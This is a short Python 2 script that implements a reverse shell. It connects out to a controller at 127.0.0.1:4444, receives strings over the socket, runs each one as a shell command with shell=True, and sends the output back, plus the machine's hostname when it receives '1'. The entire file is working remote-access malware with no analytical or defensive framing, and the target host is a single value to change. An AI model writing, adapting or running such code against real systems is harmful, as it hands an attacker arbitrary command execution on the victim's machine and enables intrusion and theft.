import socket
import subprocess

def Start():
    host = "127.0.0.1"
    port = 4444
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((host,port))
    while True:
        data =s.recv(2000)
        if data =="1":
            sysname=subprocess.check_output("hostname")
            cdcd = sysname
            print cdcd
            s.send(str(cdcd))
        print data
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        s.send(stdout_value)


Start()
